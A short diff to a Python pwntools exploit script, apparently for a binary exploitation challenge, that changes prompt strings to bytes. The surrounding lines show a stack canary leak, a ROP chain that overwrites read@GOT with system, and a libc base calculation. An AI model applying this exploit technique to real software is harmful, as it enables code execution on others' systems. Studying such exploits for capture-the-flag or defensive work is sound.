@@ -26,7 +26,7 @@ def main():
     buf2canary = 0x38
     payload = b"A" * buf2canary
 
-    r.sendlineafter("Buf: ", payload)
+    r.sendlineafter(b"Buf: ", payload)
 
     r.recvuntil(payload + b"\n")
     canary = b"\x00" + r.recvn(7)
@@ -50,7 +50,7 @@ def main():
     payload += p64(0x400596)            # ret (for stack alignment)
     payload += p64(0x4005f0)            # read@PLT (read@GOT will have been overwritten with system)
 
-    r.sendafter("Buf: ", payload)
+    r.sendafter(b"Buf: ", payload)
 
     read_va = u64(r.recvn(8))
     libc_base = read_va - libc.symbols["read"]
